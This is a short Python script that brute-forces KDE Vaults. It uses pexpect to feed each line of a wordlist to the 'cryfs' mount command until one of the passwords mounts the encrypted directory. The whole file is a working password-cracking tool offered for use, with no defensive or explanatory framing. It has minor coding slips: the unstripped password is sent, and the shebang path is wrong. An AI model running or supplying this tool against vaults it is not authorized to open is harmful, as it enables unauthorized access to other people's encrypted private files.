#!/usr/env/python3
# Author: KenjiDoom
import pexpect
import sys
import argparse

def keywords(args=None):
    parser = argparse.ArgumentParser(description='Bruteforce KDE-Vaults')
    parser.add_argument('wordlist', metavar='--w', type=str, help='Wordlist file, password file location, must be a txt file. ')
    parser.add_argument('basedir', metavar='--b', type=str, help='The base directory, ENC file location. ') 
    parser.add_argument('mountdir', metavar='--m', type=str, help='Mount directory for the ENC file. ')
    return parser.parse_args(args)


def main():
    args = keywords()
    wordlist = open(args.wordlist,  'r') # rb for bytes inlcuded

    for password in wordlist: # This will give it the loop
        passwords = password.strip() # Now we need a destination for the passwords
        command1 = pexpect.spawn('cryfs {0} {1}'.format(args.basedir, args.mountdir))
        command1.expect('Password:')
        command1.sendline(password)
        result = command1.expect(['Error 11: Could not load config file. Did you enter the correct password?', 'Mounting filesystem. To unmount, call:'])
        if result == 0:
            print('Attacking [{0}] with: {1} '.format(args.basedir, password))
        elif result == 1:
            print('Done [{0}] [{1}] Password:{2}'.format(args.basedir, args.mountdir, password))
            break



main()

